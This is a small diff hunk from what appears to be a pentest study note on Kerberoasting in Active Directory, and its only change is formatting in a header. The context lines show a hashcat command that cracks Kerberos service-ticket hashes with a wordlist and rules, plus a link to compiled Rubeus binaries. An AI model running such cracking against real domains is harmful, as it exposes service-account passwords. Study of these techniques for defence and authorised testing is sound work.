@@ -23,7 +23,7 @@ hashcat --help | grep -i "Kerberos"
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
-## **Perform Kerberoasting on Windows (joined domain):**
+## **Perform Kerberoasting on `Windows` (joined domain):**
 By using use [Rubeus]([https://github.com/GhostPack/Rubeus](https://github.com/MGamalCYSEC/Active-Directory-Enumeration-and-Attacks/tree/main/Tools/GhostPack-Compiled%20Binaries)) 
 
 ``` powershell
